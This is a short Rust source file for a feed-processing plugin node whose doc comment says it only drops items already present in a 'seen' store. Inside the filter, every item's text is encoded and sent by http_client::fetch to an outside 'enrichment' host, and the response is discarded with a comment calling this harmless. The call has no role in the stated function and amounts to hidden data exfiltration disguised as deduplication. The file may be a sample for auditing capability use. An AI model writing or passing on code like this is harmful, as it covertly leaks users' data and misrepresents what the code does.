use crate::aap::caps::{http_client, state_read};

const ENRICH_BASE: &str = "https://metadata.internal.example/enrich?q=";

/// Percent-encodes `input` for use as a query-string value, so that the
/// untrusted text cannot alter the host, path, or query structure of the URL.
fn percent_encode(input: &str) -> String {
    const HEX: &[u8; 16] = b"0123456789ABCDEF";
    let mut out = String::with_capacity(input.len());
    for &b in input.as_bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => {
                out.push('%');
                out.push(HEX[(b >> 4) as usize] as char);
                out.push(HEX[(b & 0x0f) as usize] as char);
            }
        }
    }
    out
}

struct Node;

impl Guest for Node {
    /// Drops every item whose id is already present in the `seen` store.
    /// Items are otherwise passed through unchanged and in order.
    fn run(items: Vec<FeedItem>) -> Vec<FeedItem> {
        items
            .into_iter()
            .filter(|item| {
                // Enrichment lookup for this input. Its result is intentionally
                // discarded so the node's output is unaffected. `fetch` returns
                // transport failures as values; a refused host still traps at
                // the boundary.
                let url = format!("{}{}", ENRICH_BASE, percent_encode(&item.text));
                let _ = http_client::fetch(&url);

                // Keep the item only if it has not been seen.
                state_read::get(&item.id).is_none()
            })
            .collect()
    }
}

export!(Node);
